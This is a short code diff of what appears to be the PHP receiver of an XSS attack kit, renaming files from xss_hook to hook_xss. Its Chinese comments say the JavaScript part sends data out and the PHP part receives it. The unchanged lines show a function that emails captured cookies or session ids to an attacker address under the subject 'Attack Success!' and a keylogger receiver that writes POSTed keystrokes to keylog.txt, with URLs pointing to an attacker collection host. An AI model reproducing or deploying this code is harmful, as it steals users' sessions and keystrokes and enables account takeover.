@@ -1,11 +1,11 @@
 <!--
-    xss_hook.js 文件负责外发，xss_hook.php 负责接收并发邮件与写入文本
+    hook_xss.js 文件负责外发，hook_xss.php 负责接收并发邮件与写入文本
 -->
 
 <?php
 
 // // XSS Hook Cookie: Send by email
-// // https://www.collect.hack.net/xss_hook2email.php?sid=qytang # 接收sid，外发邮件
+// // https://www.collect.hack.net/hook_xss2email.php?sid=qytang # 接收sid，外发邮件
 function send_cookie_email($sid) {
     $to = 'hack_email@hack.com'; // hack email
     $subject = 'Attack Success!'; // email title
@@ -29,7 +29,7 @@ send_cookie_email($sid);
 // <?
 
 // // XSS Hook KeyLogger: Write to keylog.txt
-// // https://www.collect.hack.net/xss_hook2email.php # 接收key，写入文本
+// // https://www.collect.hack.net/hook_xss2email.php # 接收key，写入文本
 function write_keylogger() {
     $key = $_POST['key'];
     $logfile = "keylog.txt";
